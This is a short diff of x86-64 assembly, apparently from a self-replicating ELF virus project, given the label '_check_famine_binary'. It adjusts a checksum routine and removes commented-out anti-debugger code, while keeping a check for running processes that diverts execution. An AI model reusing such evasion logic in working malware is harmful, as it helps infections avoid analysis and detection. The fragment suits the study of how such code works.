@@ -63,6 +63,7 @@ _start:
 
 _verify_checksum:
 	lea rdi, [rel _text_section_vaddr]
+	mov rdi, QWORD [rdi]
 	lea r10, [rel _total_size_to_checksum]
 	xor rsi, rsi
 	mov esi, DWORD [r10]
@@ -71,20 +72,11 @@ _verify_checksum:
 	cmp eax, DWORD [r10]
 	jne _check_alternate_start
 
-;_check_debugueur:
-;	call _checkdbg
-;	cmp rax, 0
-;	jne _check_alternate_start
-;	add QWORD [rsp + 104], 0x1
-;	cmp rax, 0
-;	jne _verify_o_entry
-
 _check_processus:
 	call _checkproc
 	cmp rax, 0
 	jne _check_alternate_start
 	add QWORD [rsp + 104], 0x10
-;	cmp QWORD [rsp + 104], 0x11
 	jmp _check_famine_binary
 
 _check_alternate_start:
